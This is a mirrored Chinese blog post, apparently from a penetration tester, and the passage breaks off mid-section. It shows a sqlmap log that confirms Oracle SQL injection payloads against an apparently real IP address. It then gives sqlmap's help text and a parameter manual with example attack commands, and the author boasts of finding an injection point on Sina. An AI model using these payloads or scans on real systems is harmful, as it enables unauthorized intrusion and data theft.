@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<!-- Mirrored from www.cnblogs.com/xinxianquan/p/8824167.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Jun 2019 01:25:43 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="referrer" content="origin" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <title>信息嗅探 - 疏桐 - 博客园</title>
+    <meta property="og:description" content="1、kali linux SQLmap 信息嗅探 [*] starting at 17:42:27 [*] starting at 17:42:27 [17:42:27] [INFO] testing" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/bundles/blog-common.css?v=KOZafwuaDasEedEenI5aTy8aXH0epbm6VUJ0v3vsT_Q1"/>
+<link id="MainCss" type="text/css" rel="stylesheet" href="https://www.cnblogs.com/skins/UnlimitedSunlight/bundle-UnlimitedSunlight.css?v=U277U0wIYS14CMa8eCm6JCKf6HhAx4Z-aYITTLKh93g1"/>
+<link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="https://www.cnblogs.com/skins/UnlimitedSunlight/bundle-UnlimitedSunlight-mobile.css?v=4ln6fqVq4L4pRmW24O2dfYf_4JqJC33CU4WevG-lN0o1"/>
+    <link title="RSS" type="application/rss+xml" rel="alternate" href="http://feed.cnblogs.com/blog/u/395031/rss"/>
+    <link title="RSD" type="application/rsd+xml" rel="EditURI" href="../rsd.xml"/>
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="../wlwmanifest.xml"/>
+    <script src="http://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script>var currentBlogId=395031;var currentBlogApp='xinxianquan',cb_enable_mathjax=true;var isLogined=false;</script>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']], processClass: 'math', processEscapes: true },
+        TeX: { 
+            equationNumbers: { autoNumber: ['AMS'], useLabelIds: true }, 
+            extensions: ['extpfeil.js'],
+            Macros: {bm: "\\boldsymbol"}
+        },
+        'HTML-CSS': { linebreaks: { automatic: true } },
+        SVG: { linebreaks: { automatic: true } }
+        });
+    </script><script src="http://mathjax.cnblogs.com/2_7_2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="https://www.cnblogs.com/bundles/blog-common.js?v=smtcUT5dhdu_5eEO8CKHYoVc7DPLgEBGzp6zKkstlzg1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+
+
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+	<a id="lnkBlogLogo" href="../index.html"><img id="blogLogo" src="https://www.cnblogs.com/Skins/custom/images/logo.gif" alt="返回主页" /></a>			
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle" href="../index.html">疏桐</a></h1>
+<h2>疏桐不懈的渗透测试之路</h2>
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">博客园</a></li>
+<li><a id="blog_nav_myhome" class="menu" href="../index.html">首页</a></li>
+<li><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
+<li><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/疏桐">联系</a></li>
+<li><a id="blog_nav_rss" class="menu" href="http://feed.cnblogs.com/blog/u/395031/rss">订阅</a>
+<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="https://www.cnblogs.com/xinxianquan/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
+<li><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
+</ul>
+		<div class="blogStats">
+			
+			<div id="blog_stats">
+<span id="stats_post_count">随笔 - 287&nbsp; </span>
+<span id="stats_article_count">文章 - 13&nbsp; </span>
+<span id="stats-comment_count">评论 - 2</span>
+</div>
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		
+        <div id="post_detail">
+<!--done-->
+<div id="topics">
+	<div class = "post">
+		<h1 class = "postTitle">
+			<a id="cb_post_title_url" class="postTitle2" href="8824167.html">信息嗅探</a>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body" class="blogpost-body"><p>1、kali linux SQLmap 信息嗅探</p>
+<div><img src="https://images2018.cnblogs.com/blog/1276904/201804/1276904-20180413214307498-536476822.png" alt="" />
+<p>&nbsp;[*] starting at 17:42:27</p>
+</div>
+<div>[17:42:27] [INFO] testing connection to the target URL<br />[17:42:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS<br />[17:42:28] [INFO] testing if the target URL content is stable<br />[17:42:29] [WARNING] target URL content is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'<br />how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] <br />[17:42:30] [INFO] testing if GET parameter 'id' is dynamic<br />[17:42:30] [WARNING] GET parameter 'id' does not appear to be dynamic<br />[17:42:30] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable<br />[17:42:30] [INFO] testing for SQL injection on GET parameter 'id'<br />[17:42:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'<br />[17:42:32] [INFO] testing 'MySQL &gt;= 5.0 boolean-based blind - Parameter replace'<br />[17:42:32] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'<br />[17:42:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'<br />[17:42:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'<br />[17:42:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'<br />[17:42:34] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'<br />[17:42:34] [INFO] testing 'MySQL inline queries'<br />[17:42:35] [INFO] testing 'PostgreSQL inline queries'<br />[17:42:35] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'<br />[17:42:35] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'<br />[17:42:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'<br />[17:42:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'<br />[17:42:36] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'<br />[17:42:36] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'<br />[17:42:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'<br />[17:42:37] [INFO] testing 'Oracle AND time-based blind'<br />[17:42:48] [INFO] GET parameter 'id' appears to be 'Oracle AND time-based blind' injectable <br />it looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] <br />for the remaining tests, do you want to include all tests for 'Oracle' extending provided level (1) and risk (1) values? [Y/n] <br />[17:42:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'<br />[17:42:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found<br />[17:42:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test<br />[17:42:54] [INFO] target URL appears to have 80 columns in query<br />[17:43:57] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable<br />GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] <br />sqlmap identified the following injection point(s) with a total of 265 HTTP(s) requests:<br />---<br />Parameter: id (GET)<br />&nbsp;&nbsp;&nbsp; Type: AND/OR time-based blind<br />&nbsp;&nbsp;&nbsp; Title: Oracle AND time-based blind<br />&nbsp;&nbsp;&nbsp; Payload: id=172085211005' AND 2892=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(103)||CHR(67)||CHR(105),5) AND 'IkNF'='IkNF<br /><br />&nbsp;&nbsp;&nbsp; Type: UNION query<br />&nbsp;&nbsp;&nbsp; Title: Generic UNION query (NULL) - 80 columns<br />&nbsp;&nbsp;&nbsp; Payload: id=-6239' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)||CHR(102)||CHR(99)||CHR(99)||CHR(121)||CHR(74)||CHR(115)||CHR(90)||CHR(87)||CHR(106)||CHR(79)||CHR(111)||CHR(98)||CHR(105)||CHR(108)||CHR(117)||CHR(102)||CHR(106)||CHR(85)||CHR(120)||CHR(107)||CHR(109)||CHR(107)||CHR(122)||CHR(73)||CHR(68)||CHR(122)||CHR(118)||CHR(105)||CHR(117)||CHR(112)||CHR(122)||CHR(116)||CHR(107)||CHR(70)||CHR(108)||CHR(114)||CHR(86)||CHR(102)||CHR(102)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(120)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- XhXq<br />---<br />[17:44:00] [INFO] the back-end DBMS is Oracle<br />web application technology: JSP<br />back-end DBMS: Oracle<br />[17:44:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/202.201.33.73'<br />[*] shutting down at 17:44:00<br />2、帮助文档命令</div>
+<div>Usage: python sqlmap [options]<br /><br />Options:<br />&nbsp; -h, --help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show basic help message and exit<br />&nbsp; -hh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show advanced help message and exit<br />&nbsp; --version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show program's version number and exit<br />&nbsp; -v VERBOSE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Verbosity level: 0-6 (default 1)<br /><br />&nbsp; Target:<br />&nbsp;&nbsp;&nbsp; At least one of these options has to be provided to define the<br />&nbsp;&nbsp;&nbsp; target(s)<br /><br />&nbsp;&nbsp;&nbsp; -u URL, --url=URL&nbsp;&nbsp; Target URL (e.g. "http://www.site.com/vuln.php?id=1")<br />&nbsp;&nbsp;&nbsp; -g GOOGLEDORK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process Google dork results as target URLs<br /><br />&nbsp; Request:<br />&nbsp;&nbsp;&nbsp; These options can be used to specify how to connect to the target URL<br /><br />&nbsp;&nbsp;&nbsp; --data=DATA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Data string to be sent through POST<br />&nbsp;&nbsp;&nbsp; --cookie=COOKIE&nbsp;&nbsp;&nbsp;&nbsp; HTTP Cookie header value<br />&nbsp;&nbsp;&nbsp; --random-agent&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use randomly selected HTTP User-Agent header value<br />&nbsp;&nbsp;&nbsp; --proxy=PROXY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use a proxy to connect to the target URL<br />&nbsp;&nbsp;&nbsp; --tor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use Tor anonymity network<br />&nbsp;&nbsp;&nbsp; --check-tor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Check to see if Tor is used properly<br /><br />&nbsp; Injection:<br />&nbsp;&nbsp;&nbsp; These options can be used to specify which parameters to test for,<br />&nbsp;&nbsp;&nbsp; provide custom injection payloads and optional tampering scripts<br /><br />&nbsp;&nbsp;&nbsp; -p TESTPARAMETER&nbsp;&nbsp;&nbsp; Testable parameter(s)<br />&nbsp;&nbsp;&nbsp; --dbms=DBMS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Force back-end DBMS to this value<br /><br />&nbsp; Detection:<br />&nbsp;&nbsp;&nbsp; These options can be used to customize the detection phase<br /><br />&nbsp;&nbsp;&nbsp; --level=LEVEL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Level of tests to perform (1-5, default 1)<br />&nbsp;&nbsp;&nbsp; --risk=RISK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Risk of tests to perform (1-3, default 1)<br /><br />&nbsp; Techniques:<br />&nbsp;&nbsp;&nbsp; These options can be used to tweak testing of specific SQL injection<br />&nbsp;&nbsp;&nbsp; techniques<br /><br />&nbsp;&nbsp;&nbsp; --technique=TECH&nbsp;&nbsp;&nbsp; SQL injection techniques to use (default "BEUSTQ")<br /><br />&nbsp; Enumeration:<br />&nbsp;&nbsp;&nbsp; These options can be used to enumerate the back-end database<br />&nbsp;&nbsp;&nbsp; management system information, structure and data contained in the<br />&nbsp;&nbsp;&nbsp; tables. Moreover you can run your own SQL statements<br /><br />&nbsp;&nbsp;&nbsp; -a, --all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Retrieve everything<br />&nbsp;&nbsp;&nbsp; -b, --banner&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Retrieve DBMS banner<br />&nbsp;&nbsp;&nbsp; --current-user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Retrieve DBMS current user<br />&nbsp;&nbsp;&nbsp; --current-db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Retrieve DBMS current database<br />&nbsp;&nbsp;&nbsp; --passwords&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enumerate DBMS users password hashes<br />&nbsp;&nbsp;&nbsp; --tables&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enumerate DBMS database tables<br />&nbsp;&nbsp;&nbsp; --columns&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enumerate DBMS database table columns<br />&nbsp;&nbsp;&nbsp; --schema&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enumerate DBMS schema<br />&nbsp;&nbsp;&nbsp; --dump&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dump DBMS database table entries<br />&nbsp;&nbsp;&nbsp; --dump-all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dump all DBMS databases tables entries<br />&nbsp;&nbsp;&nbsp; -D DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DBMS database to enumerate<br />&nbsp;&nbsp;&nbsp; -T TBL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DBMS database table(s) to enumerate<br />&nbsp;&nbsp;&nbsp; -C COL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DBMS database table column(s) to enumerate<br /><br />&nbsp; Operating system access:<br />&nbsp;&nbsp;&nbsp; These options can be used to access the back-end database management<br />&nbsp;&nbsp;&nbsp; system underlying operating system<br /><br />&nbsp;&nbsp;&nbsp; --os-shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prompt for an interactive operating system shell<br />&nbsp;&nbsp;&nbsp; --os-pwn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prompt for an OOB shell, Meterpreter or VNC<br /><br />&nbsp; General:<br />&nbsp;&nbsp;&nbsp; These options can be used to set some general working parameters<br /><br />&nbsp;&nbsp;&nbsp; --batch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Never ask for user input, use the default behaviour<br />&nbsp;&nbsp;&nbsp; --flush-session&nbsp;&nbsp;&nbsp;&nbsp; Flush session files for current target<br /><br />&nbsp; Miscellaneous:<br />&nbsp;&nbsp;&nbsp; --sqlmap-shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prompt for an interactive sqlmap shell<br />&nbsp;&nbsp;&nbsp; --wizard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Simple wizard interface for beginner users<br />附录：参数手册</div>
+<div>
+<p>sqlmap支持五种不同的注入模式：</p>
+<pre><code>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+
+4、联合查询注入，可以使用union的情况下的注入。
+
+5、堆查询注入，可以同时执行多条语句的执行时的注入。
+</code></pre>
+<p>sqlmap支持的数据库有：</p>
+<pre><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</code></pre>
+<p>可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。</p>
+<p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p>
+<p>可以设定HTTP(S)请求的并发数，来提高盲注时的效率。</p>
+<p>Youtube上有人做的使用sqlmap的视频：</p>
+<p><a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a></p>
+<p><a href="http://www.youtube.com/user/stamparm/videos">http://www.youtube.com/user/stamparm/videos</a></p>
+<p>使用sqlmap的实例文章：</p>
+<p><a href="http://unconciousmind.blogspot.com/search/label/sqlmap">http://unconciousmind.blogspot.com/search/label/sqlmap</a></p>
+<p>可以点击<a href="https://github.com/sqlmapproject/sqlmap/tarball/master">https://github.com/sqlmapproject/sqlmap/tarball/master</a>下载最新版本sqlmap。</p>
+<p>也可以使用git来获取sqlmap</p>
+<pre><code>git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+</code></pre>
+<p>之后可以直接使用命令来更新</p>
+<pre><code>python sqlmap.py --update
+</code></pre>
+<p>或者</p>
+<pre><code>git pull
+</code></pre>
+<p>更新sqlmap</p>
+<p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
+<p>共有七个等级，默认为1：</p>
+<pre><code>0、只显示python错误以及严重的信息。
+
+1、同时显示基本信息和警告信息。（默认）
+
+2、同时显示debug信息。
+
+3、同时显示注入的payload。
+
+4、同时显示HTTP请求。
+
+5、同时显示HTTP响应头。
+
+6、同时显示HTTP响应页面。
+</code></pre>
+<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
+<h2>获取目标方式</h2>
+<hr />
+<h3>目标URL</h3>
+<p>参数：-u或者--url</p>
+<p>格式：<code>http(s)://targeturl[:port]/[&hellip;]</code></p>
+<p>例如：<code>python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users</code></p>
+<p>从Burp或者WebScarab代理中获取日志</p>
+<p>参数：-l</p>
+<p>可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。</p>
+<h3>从文本中获取多个目标扫描</h3>
+<p>参数：-m</p>
+<p>文件中保存url格式如下，sqlmap会一个一个检测</p>
+<pre><code>www.target1.com/vuln1.php?q=foobar
+
+www.target2.com/vuln2.asp?id=1
+
+www.target3.com/vuln3/id/1*
+</code></pre>
+<h3>从文件中加载HTTP请求</h3>
+<p>参数：-r</p>
+<p>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<pre><code>POST /vuln.php HTTP/1.1
+Host: www.target.com
+User-Agent: Mozilla/4.0
+
+id=1
+</code></pre>
+<p>当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后门加上:443</p>
+<h3>处理Google的搜索结果</h3>
+<p>参数：-g</p>
+<p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -g "inurl:\".php?id=1\""
+</code></pre>
+<p>（很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）</p>
+<p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
+<h2>请求</h2>
+<hr />
+<h3>http数据</h3>
+<p>参数：--data</p>
+<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
+</code></pre>
+<h3>参数拆分字符</h3>
+<p>参数：--param-del</p>
+<p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
+</code></pre>
+<h3>HTTP cookie头</h3>
+<p>参数：--cookie,--load-cookies,--drop-set-cookie</p>
+<p>这个参数在以下两个方面很有用：</p>
+<p>1、web应用需要登陆的时候。</p>
+<p>2、你想要在这些头参数中测试SQL注入时。</p>
+<p>可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。</p>
+<p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p>
+<p>如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。</p>
+<p>当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
+<h3>HTTP User-Agent头</h3>
+<p>参数：--user-agent,--random-agent</p>
+<p>默认情况下sqlmap的HTTP请求头中User-Agent值是：</p>
+<pre><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
+</code></pre>
+<p>可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。</p>
+<p>当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p>
+<h3>HTTP Referer头</h3>
+<p>参数：--referer</p>
+<p>sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</p>
+<h3>额外的HTTP头</h3>
+<p>参数：--headers</p>
+<p>可以通过--headers参数来增加额外的http头</p>
+<h3>HTTP认证保护</h3>
+<p>参数：--auth-type,--auth-cred</p>
+<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>
+<p>1、Basic</p>
+<p>2、Digest</p>
+<p>3、NTLM</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
+</code></pre>
+<h3>HTTP协议的证书认证</h3>
+<p>参数：--auth-cert</p>
+<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。</p>
+<p>key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
+<h3>HTTP(S)代理</h3>
+<p>参数：--proxy,--proxy-cred和--ignore-proxy</p>
+<p>使用--proxy代理是格式为：http://url:port。</p>
+<p>当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。</p>
+<p>--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</p>
+<h3>HTTP请求延迟</h3>
+<p>参数：--delay</p>
+<p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<h3>设定超时时间</h3>
+<p>参数：--timeout</p>
+<p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p>
+<h3>设定重试超时</h3>
+<p>参数：--retries</p>
+<p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
+<h3>设定随机改变的参数值</h3>
+<p>参数：--randomize</p>
+<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
+<h3>利用正则过滤目标网址</h3>
+<p>参数：--scope</p>
+<p>例如：</p>
+<pre><code>python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
+</code></pre>
+<h3>避免过多的错误请求被屏蔽</h3>
+<p>参数：--safe-url,--safe-freq</p>
+<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
+<p>绕过这个策略有两种方式：</p>
+<pre><code>1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
+2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
+</code></pre>
+<h3>关掉URL参数值编码</h3>
+<p>参数：--skip-urlencode</p>
+<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。</p>
+<h3>每次请求时候执行自定义的python代码</h3>
+<p>参数：--eval</p>
+<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -u "http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
+</code></pre>
+<p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p>
+<h2>注入</h2>
+<hr />
+<h2>测试参数</h2>
+<p>参数：-p,--skip</p>
+<p>sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"</p>
+<p>当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。</p>
+<p>例如：--skip="user-angent.referer"</p>
+<p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p>
+<p>例如：</p>
+<pre><code>python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
+</code></pre>
+<p>sqlmap将会测试value1的位置是否可注入。</p>
+<h3>指定数据库</h3>
+<p>参数：--dbms</p>
+<p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p>
+<pre><code>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
+</code></pre>
+<h3>指定数据库服务器系统</h3>
+<p>参数：--os</p>
+<p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p>
+<h3>指定无效的大数字</h3>
+<p>参数：--invalid-bignum</p>
+<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</p>
+<h3>指定无效的逻辑</h3>
+<p>参数：--invalid-logical</p>
+<p>原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。</p>
+<h3>注入payload</h3>
+<p>参数：--prefix,--suffix</p>
+<p>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
+<p>例如，代码中是这样调用数据库的：</p>
+<pre><code>$query = "SELECT * FROM users WHERE id=(&rsquo;" . $_GET[&rsquo;id&rsquo;] . "&rsquo;) LIMIT 0, 1"; 
+</code></pre>
+<p>这时你就需要--prefix和--suffix参数了：</p>
